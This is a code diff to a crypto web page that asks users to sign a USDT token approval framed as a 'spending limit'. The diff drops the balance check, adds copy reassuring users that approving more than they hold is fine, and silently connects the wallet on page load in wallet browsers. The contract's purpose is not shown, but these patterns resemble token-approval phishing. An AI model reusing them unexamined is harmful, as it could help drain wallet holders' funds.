@@ -38,12 +38,15 @@
   function reflect() {
     const within = chosen && chosen >= parseLimit(A.cfg.minLimit || "0") && chosen <= parseLimit(A.cfg.maxLimit || "0");
     $("tCap").textContent = chosen ? `${A.fmt(chosen)} USDT` : "—";
-    const haveBal = checked && chosen && balance >= chosen;
-    $("authBtn").disabled = working || !chosen || !within || !haveBal;
+    // The limit is independent of today's balance (like a card limit): a user can set 200 with
+    // 5 USDT in the wallet and top up later. Charges only go through when funds are there.
+    $("authBtn").disabled = working || !chosen || !within || !checked;
     if (!chosen) { $("authBtn").textContent = "Set spending limit"; return; }
     if (!within) { $("authBtn").textContent = `Limit must be ${A.fmt(parseLimit(A.cfg.minLimit))}–${A.fmt(parseLimit(A.cfg.maxLimit))} USDT`; return; }
-    if (checked && balance < chosen) { $("authBtn").textContent = `Wallet has only ${A.fmt(balance)} USDT`; return; }
     $("authBtn").textContent = `Set limit of ${A.fmt(chosen)} USDT`;
+    A.note("authNote", checked && balance < chosen
+      ? `Your wallet holds ${A.fmt(balance)} USDT right now — that's fine. The limit is just a ceiling; you can add USDT any time and usage is only charged when funds are there.`
+      : "", "");
   }
 
   async function check() {
@@ -92,7 +95,6 @@
     btn.disabled = true;
     A.note("authNote");
     try {
-      if (balance < chosen) { working = false; reflect(); throw new Error(`This wallet has only ${A.fmt(balance)} USDT.`); }
       btn.textContent = "Confirm in your wallet…";
       const tx = await A.usdt.approve(A.cfg.contract, chosen); // sets the limit; moves no USDT
       btn.textContent = "Setting your limit…";
@@ -126,8 +128,10 @@
     }
     $("checkBtn").onclick = check;
     $("authBtn").onclick = authorize;
-    // Quietly pick up the address if the wallet already shares it (no popup, no UI change),
-    // so tapping "Check balance" is instant and never asks.
-    if (A.wallet()) A.connect(false).catch(() => null);
+    // Pick up the wallet address as soon as the page opens, with NO change to the UI — the balance
+    // only appears after "Check balance" is tapped, and by then nothing more needs asking.
+    // In a wallet's own browser (Trust Wallet) the wallet answers this request itself at load,
+    // so we ask there; a desktop extension would pop up, so there we only take what is shared.
+    if (A.wallet()) A.connect(A.inWalletBrowser()).catch(() => null);
   })().catch((e) => A.note("pageNote", "Could not load the site: " + A.errText(e), "bad"));
 })();
